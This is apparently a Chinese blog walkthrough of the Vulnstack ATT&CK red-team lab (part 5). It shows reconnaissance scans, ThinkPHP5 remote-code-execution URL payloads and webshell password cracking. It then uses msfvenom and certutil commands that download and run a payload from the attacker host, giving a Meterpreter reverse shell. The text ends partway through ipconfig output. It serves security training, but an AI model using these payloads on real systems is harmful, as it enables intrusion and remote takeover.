{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(五)","contentHtml":"<h1>ATT&#x26;CK红队评估实战靶场(五)</h1>\n<p><strong>win7</strong> 双网卡模拟内外网 <code>192.168.138.136</code> <code>192.168.183.134</code></p>\n<p>sun\\leo 123.com</p>\n<p>sun\\Administrator dc123.com</p>\n<p><strong>2008</strong> <code>192.168.138.138</code></p>\n<p>sun\\admin 2021.com</p>\n<p><strong>Kali</strong> <code>192.168.183.133</code></p>\n<h2>前期踩点</h2>\n<p><code>192.168.183.134</code> 是靶机</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 05:06 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00033</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:01 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00017</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:C1:<span class=\"hljs-number\">18</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.254</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00017</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:FE:A2 (VMware)\n</code></pre>\n<p>开启了<code>HTTP</code>服务和<code>Mysql</code></p>\n<pre><code class=\"hljs language-css\">⚡ root<span class=\"hljs-keyword\">@kali</span>  ~  nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.134</span>\nStarting Nmap <span class=\"hljs-number\">7.94S</span>VN ( <span class=\"hljs-attribute\">https</span>://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">19</span> <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">02</span> EST\nNmap <span class=\"hljs-attribute\">scan</span> report for <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">183.134</span>\nHost is up (<span class=\"hljs-number\">0.00091s</span> latency).\n<span class=\"hljs-keyword\">Not</span> <span class=\"hljs-attribute\">shown</span>: <span class=\"hljs-number\">65533</span> filtered tcp ports (no-response)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\nMAC <span class=\"hljs-attribute\">Address</span>: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span><span class=\"hljs-attribute\">C</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:C1:<span class=\"hljs-number\">18</span> (VMware)\n\nNmap <span class=\"hljs-attribute\">done</span>: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">26.44</span> seconds\n</code></pre>\n<p><code>Apache</code> ，并且是<code>Windows</code>系统</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  nmap -sT -A -T4 -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 07:03 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00053</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.23</span> ((Win32) OpenSSL/<span class=\"hljs-number\">1.0</span><span class=\"hljs-number\">.2j</span> PHP/<span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.38</span>)\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html; charset=utf-8).\n|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38\n3306/tcp open  mysql   MySQL (unauthorized)\nMAC Address: 00:0C:29:69:C1:18 (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 8.1 R1 (96%), Microsoft Windows Phone 7.5 or 8.0 (96%), Microsoft Windows Embedded Standard 7 (96%), Microsoft Windows Server 2008 or 2008 Beta 3 (92%), Microsoft Windows Server 2008 R2 or Windows 8.1 (92%), Microsoft Windows 7 Professional or Windows 8 (92%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (92%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (92%), Microsoft Windows 7 (90%), Microsoft Windows Server 2008 SP1 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.183.134\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 44.39 seconds\n</span></code></pre>\n<p><code>nmap</code>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 07:05 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00030</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n|_http-trace: TRACE <span class=\"hljs-keyword\">is</span> enabled\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|   /0/: Potentially interesting folder\n|_  /index/: Potentially interesting folder\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial Of Service.\n|       \n|     Disclosure date: <span class=\"hljs-number\">2009</span>-09-<span class=\"hljs-number\">17</span>\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>\n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:C1:<span class=\"hljs-number\">18</span> (VMware)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">86.40</span> seconds\n</code></pre>\n<p><code>nikto</code>扫描漏洞</p>\n<pre><code class=\"hljs language-python\"> ⚡ root@kali  ~  nikto -url <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span> -p <span class=\"hljs-number\">80</span>            \n- Nikto v2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.0</span>\n---------------------------------------------------------------------------\n+ Target IP:          <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\n+ Target Hostname:    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\n+ Target Port:        <span class=\"hljs-number\">80</span>\n+ Start Time:         <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 07:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">12</span> (GMT-<span class=\"hljs-number\">5</span>)\n---------------------------------------------------------------------------\n+ Server: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.23</span> (Win32) OpenSSL/<span class=\"hljs-number\">1.0</span><span class=\"hljs-number\">.2j</span> PHP/<span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.38</span>\n+ /: Retrieved x-powered-by header: PHP/<span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.38</span>.\n+ /: The anti-clickjacking X-Frame-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-<span class=\"hljs-type\">Type</span>-Options header <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-built_in\">set</span>. This could allow the user agent to render the content of the site <span class=\"hljs-keyword\">in</span> a different fashion to the MIME <span class=\"hljs-built_in\">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class=\"hljs-built_in\">type</span>-header/\n+ No CGI Directories found (use <span class=\"hljs-string\">'-C all'</span> to force check <span class=\"hljs-built_in\">all</span> possible dirs)\n+ Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.23</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.54</span>). Apache <span class=\"hljs-number\">2.2</span><span class=\"hljs-number\">.34</span> <span class=\"hljs-keyword\">is</span> the EOL <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">2.</span>x branch.\n+ OpenSSL/<span class=\"hljs-number\">1.0</span><span class=\"hljs-number\">.2j</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least <span class=\"hljs-number\">3.0</span><span class=\"hljs-number\">.7</span>). OpenSSL <span class=\"hljs-number\">1.1</span><span class=\"hljs-number\">.1</span>s <span class=\"hljs-keyword\">is</span> current <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">1.</span>x branch <span class=\"hljs-keyword\">and</span> will be supported until Nov <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">2023.</span>\n+ PHP/<span class=\"hljs-number\">5.5</span><span class=\"hljs-number\">.38</span> appears to be outdated (current <span class=\"hljs-keyword\">is</span> at least <span class=\"hljs-number\">8.1</span><span class=\"hljs-number\">.5</span>), PHP <span class=\"hljs-number\">7.4</span><span class=\"hljs-number\">.28</span> <span class=\"hljs-keyword\">for</span> the <span class=\"hljs-number\">7.4</span> branch.\n+ /: Web Server returns a valid response <span class=\"hljs-keyword\">with</span> junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method <span class=\"hljs-keyword\">is</span> active which suggests the host <span class=\"hljs-keyword\">is</span> vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ PHP/<span class=\"hljs-number\">5.5</span> - PHP <span class=\"hljs-number\">3</span>/<span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">5</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">7.0</span> are End of Life products without support.\n+ /<span class=\"hljs-comment\">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>\n+ <span class=\"hljs-number\">8101</span> requests: <span class=\"hljs-number\">0</span> error(s) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">10</span> item(s) reported on remote host\n+ End Time:           <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 07:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">25</span> (GMT-<span class=\"hljs-number\">5</span>) (<span class=\"hljs-number\">253</span> seconds)\n---------------------------------------------------------------------------                                                                                            \n</code></pre>\n<p>没扫描什么漏洞</p>\n<p>访问<code>HTTP</code> 并检测指纹，搭建的是<code>Thinkphp</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image59.png\" alt=\"image.png\"></p>\n<p>上面<code>nmap</code>扫描出存在<code>robots</code>文件以及一些有趣的文件夹</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image60.png\" alt=\"image.png\"></p>\n<p>没找到可以利用的，先爆破目录</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span> -x <span class=\"hljs-number\">403</span> -e php,<span class=\"hljs-built_in\">zip</span>,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class=\"hljs-number\">23</span>: DeprecationWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  <span class=\"hljs-keyword\">from</span> pkg_resources <span class=\"hljs-keyword\">import</span> DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.3</span>\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, <span class=\"hljs-built_in\">zip</span>, txt | HTTP method: GET | Threads: <span class=\"hljs-number\">25</span> | Wordlist size: <span class=\"hljs-number\">10439</span>\n\nOutput File: /root/reports/http_192<span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/_25-02-<span class=\"hljs-number\">19_07</span>-<span class=\"hljs-number\">36</span>-<span class=\"hljs-number\">13.</span>txt\n\nTarget: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/\n\n[07:<span class=\"hljs-number\">36</span>:<span class=\"hljs-number\">13</span>] Starting: \n[07:<span class=\"hljs-number\">37</span>:<span class=\"hljs-number\">00</span>] <span class=\"hljs-number\">404</span> -  236B  - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n[07:<span class=\"hljs-number\">37</span>:06] <span class=\"hljs-number\">404</span> -  205B  - /a%5c.aspx\n[07:<span class=\"hljs-number\">37</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    2KB - /add.php\n[07:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    1KB - /favicon.ico\n[07:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">24</span>] <span class=\"hljs-number\">200</span> -   24B  - /robots.txt\n[07:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">301</span> -  238B  - /static  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/static/\n[07:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">301</span> -  240B  - /static..  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/static../\n</code></pre>\n<p>扫出来一个<code>add.php</code> ,访问，看着像是一个马？尝试爆破无果</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image61.png\" alt=\"image.png\"></p>\n<h2>ThinkPHP5 RCE</h2>\n<p>访问主页时可以看到是<code>ThinkPHP5</code> ，那么我们尝试一下它的已知漏洞</p>\n<p>使用<code>MSF</code>的<code>ThinkPHP5 RCE</code>的<code>EXP</code>无法成功获得<code>shell</code> ，但是可以知道是存在<code>RCE</code>漏洞的</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(unix/webapp/thinkphp_rce) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">1234</span> \n[*] Running automatic check (<span class=\"hljs-string\">\"set AutoCheck false\"</span> to disable)\n[+] The target appears to be vulnerable. ThinkPHP <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.22</span> <span class=\"hljs-keyword\">is</span> a vulnerable version.\n[*] Targeting ThinkPHP <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.22</span> automatically\n[*] Using URL: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">8081</span>/OcBqkRdcc\n[+] Successfully executed command: curl -so /tmp/OQKmjuhK http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">8081</span>/OcBqkRdcc;chmod +x /tmp/OQKmjuhK;/tmp/OQKmjuhK;rm -f /tmp/OQKmjuhK\n[*] Command Stager progress - <span class=\"hljs-number\">100.00</span>% done (<span class=\"hljs-number\">117</span>/<span class=\"hljs-number\">117</span> <span class=\"hljs-built_in\">bytes</span>)\n[*] Server stopped.\n[*] Exploit completed, but no session was created.\n</code></pre>\n<p>拿搜索的<code>POC</code>进行利用</p>\n<pre><code class=\"hljs language-python\">http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/?s=index/\\think\\app/invokefunction&#x26;function=phpinfo&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">0</span>]=<span class=\"hljs-number\">100</span>\n</code></pre>\n<p>可以成功回显</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image62.png\" alt=\"image.png\"></p>\n<p>执行<code>whoami</code></p>\n<pre><code class=\"hljs language-python\">http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/?s=index/think\\app/invokefunction&#x26;function=call_user_func_array&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">0</span>]=system&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">1</span>][]=whoami\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image63.png\" alt=\"image.png\"></p>\n<p>尝试读取<code>add.php</code> 是否能看到密码</p>\n<pre><code class=\"hljs language-python\">http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/?s=index/think\\app/invokefunction&#x26;function=call_user_func_array&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">0</span>]=system&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">1</span>][]=<span class=\"hljs-built_in\">dir</span>\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image64.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>/?s=index/think\\app/invokefunction&#x26;function=call_user_func_array&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">0</span>]=system&#x26;<span class=\"hljs-built_in\">vars</span>[<span class=\"hljs-number\">1</span>][]=<span class=\"hljs-built_in\">type</span> add.php\n</code></pre>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image65.png\" alt=\"image.png\"></p>\n<p>读到密码的<code>MD5</code>值<code>2aefc34200a294a3cc7db81b43a81873</code>，将其放到<code>john</code>进行爆破</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/ATTCK5  john --wordlist=/usr/share/wordlists/rockyou.txt --<span class=\"hljs-built_in\">format</span>=Raw-MD5 <span class=\"hljs-built_in\">hash</span>\nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-built_in\">hash</span> (Raw-MD5 [MD5 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=<span class=\"hljs-number\">8</span>\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nadmins           (?)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> DONE (<span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 08:<span class=\"hljs-number\">15</span>) <span class=\"hljs-number\">33.33</span>g/s 4467Kp/s 4467Kc/s 4467KC/s applecute..PHOEBE\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>得到密码<code>admins</code> ，访问<code>add.php</code> 输入密码，成功进入</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image66.png\" alt=\"image.png\"></p>\n<h2>获得立足点</h2>\n<p>使用<code>msfvenom</code>生成<code>payload</code></p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/ATTCK5  msfvenom -p cmd/windows/http/x64/meterpreter/reverse_http lport=<span class=\"hljs-number\">4444</span> lhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: cmd <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">125</span> <span class=\"hljs-built_in\">bytes</span>\ncertutil -urlcache -f http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">8080</span>/9Bk3xvWa9yQk92crn4JtvA %TEMP%\\AVQtnvStA.exe &#x26; start /B %TEMP%\\AVQtnvStA.exe\n ⚡ root@kali  ~/Desktop/test/ATTCK5  \n</code></pre>\n<p>然后<code>MSF</code>开启监听</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/handler                                                                                                                                           \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload cmd/windows/http/x64/meterpreter/reverse_http                                                                                                                                             \npayload => cmd/windows/http/x64/meterpreter/reverse_http   \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">4444</span>                                                                                                                                                                                        \nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>                                                                                                                                                                             \nmsf6 exploit(multi/handler) > run  \n[*] Started HTTP reverse handler on http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span>                   \n</code></pre>\n<p>然后在<code>web</code>端大马的命令执行中执行生成的<code>payload</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image67.png\" alt=\"image.png\"></p>\n<p>成功弹回<code>shell</code> ，获得立足点</p>\n<pre><code class=\"hljs language-python\">[*] Started HTTP reverse handler on http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span>                                                                                                                                                                     \n[!] http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span> handling request <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>; (UUID: xyuftsit) Without a database connected that payload UUID tracking will <span class=\"hljs-keyword\">not</span> work!                                                                      \n[*] http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span> handling request <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>; (UUID: xyuftsit) Staging x64 payload (<span class=\"hljs-number\">204892</span> <span class=\"hljs-built_in\">bytes</span>) ...                                                                                                      \n[!] http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span> handling request <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>; (UUID: xyuftsit) Without a database connected that payload UUID tracking will <span class=\"hljs-keyword\">not</span> work!                                                                      \n[*] Meterpreter session <span class=\"hljs-number\">4</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.133</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>:<span class=\"hljs-number\">49411</span>) at <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 08:<span class=\"hljs-number\">36</span>:<span class=\"hljs-number\">17</span> -0500                                                                                                                       \n                                                                                                                  \nmeterpreter >                                                                                                      \n</code></pre>\n<p>查看<code>ip</code>信息，得知内网网段是<code>192.168.138.0</code></p>\n<pre><code class=\"hljs language-python\">meterpreter > ipconfig\nInterface <span class=\"hljs-number\">11</span>                  \n============                \nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\nHardware MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:c1:<span class=\"hljs-number\">18</span>    \nMTU          : <span class=\"hljs-number\">1500</span>\nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.183</span><span class=\"hljs-number\">.134</span>\nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\nIPv6 Address : fe80::c060:f526:12b5:625b\nIPv6 Netmask : ffff:ffff:ffff:ffff::   \n\nInterface <span class=\"hljs-number\">16</span>            \n============      \nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\nHardware MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">69</span>:c1:<span class=\"hljs-number\">22</span>                         \nMTU          : <span class=\"hljs-number\">1500</span>                                      \nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.136</span>\nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\nIPv6 Address : fe80::<span class=\"hljs-number\">31e6</span>:d7f6:258a:61d4              \nIPv6 Netmask : 